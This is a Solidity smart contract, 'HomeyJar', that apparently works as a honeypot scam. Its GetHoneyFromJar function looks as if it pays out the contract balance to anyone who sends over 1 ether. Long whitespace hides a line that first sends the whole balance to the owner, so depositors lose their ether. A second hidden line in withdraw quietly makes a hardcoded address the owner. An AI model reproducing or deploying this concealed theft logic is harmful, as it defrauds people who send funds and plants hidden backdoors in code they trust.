pragma solidity ^0.4.19;

contract HomeyJar {
    address public Owner = getInitialOwner();
    
    function getInitialOwner() private view returns (address) {
        return msg.sender;
    }
   
    function() public payable {}
   
    function GetHoneyFromJar() public payable {                                              
        if(getMsgValue() > 1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    getOwner().transfer(getBalance());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(getBalance());
        }                                                                                                                
    }

    function getOwner() private view returns (address) {
        return Owner;
    }

    function getBalance() private view returns (uint256) {
        return this.balance;
    }

    function getMsgValue() private view returns (uint256) {
        return msg.value;
    }
    
    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==getSpecificAddress()){Owner=getSpecificAddress();}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == getOwner());
        getOwner().transfer(getBalance());
    }

    function getSpecificAddress() private pure returns (address) {
        return 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
    }
    
    function Command(address adr,bytes data) payable public {
        require(msg.sender == getOwner());
          
        adr.call.value(getMsgValue())(data);
    }
}